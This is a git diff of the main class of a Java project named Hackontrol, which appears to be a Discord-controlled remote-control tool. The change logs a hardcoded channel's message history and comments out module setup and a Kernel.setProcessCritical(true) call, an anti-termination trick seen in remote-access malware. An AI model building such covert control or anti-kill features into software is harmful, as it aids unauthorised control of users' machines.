@@ -13,20 +13,20 @@ import org.slf4j.LoggerFactory;
 import com.khopan.hackontrol.manager.Manager;
 import com.khopan.hackontrol.module.Module;
 import com.khopan.hackontrol.nativelibrary.Information;
-import com.khopan.hackontrol.nativelibrary.Kernel;
 import com.khopan.hackontrol.registration.ManagerRegistry;
 import com.khopan.hackontrol.registration.ModuleRegistry;
 import com.khopan.hackontrol.registry.ClassRegistration;
 import com.khopan.hackontrol.registry.RegistryType;
 import com.khopan.hackontrol.registry.implementation.FilteredTypeRegistry;
-import com.khopan.hackontrol.registry.implementation.RegistryImplementation;
 import com.khopan.hackontrol.security.SecurityManager;
 import com.khopan.hackontrol.utils.ErrorHandler;
 import com.khopan.hackontrol.utils.HackontrolError;
+import com.khopan.hackontrol.widget.ControlMessage;
 
 import net.dv8tion.jda.api.JDA;
 import net.dv8tion.jda.api.JDABuilder;
 import net.dv8tion.jda.api.entities.Guild;
+import net.dv8tion.jda.api.entities.Message;
 import net.dv8tion.jda.api.entities.MessageHistory;
 import net.dv8tion.jda.api.entities.channel.concrete.Category;
 import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
@@ -94,6 +94,18 @@ public class Hackontrol {
 
 		this.category = category;
 		SecurityManager.configureViewPermission(this.category.getManager());
+		TextChannel channel = this.guild.getTextChannelById(1249281558855028787L);
+		List<Message> list = MessageHistory.getHistoryFromBeginning(channel).complete().getRetrievedHistory();
+
+		for(Message message : list) {
+			message.getButtons();
+			Hackontrol.LOGGER.info(message.getContentRaw());
+		}
+
+		ControlMessage message = ControlMessage.newBuilder().build();
+		/*PanelManager panelManager = new PanelManager();
+		PanelRegistry.register(panelManager);
+		panelManager.start(this.category);
 
 		for(Module module : this.moduleList) {
 			TextChannel textChannel = this.getOrCreateTextChannelInCategory(this.category, module.getName());
@@ -115,7 +127,7 @@ public class Hackontrol {
 			manager.initialize();
 		}
 
-		Kernel.setProcessCritical(true);
+		Kernel.setProcessCritical(true);*/
 	}
 
 	private TextChannel getOrCreateTextChannelInCategory(Category category, String name) {
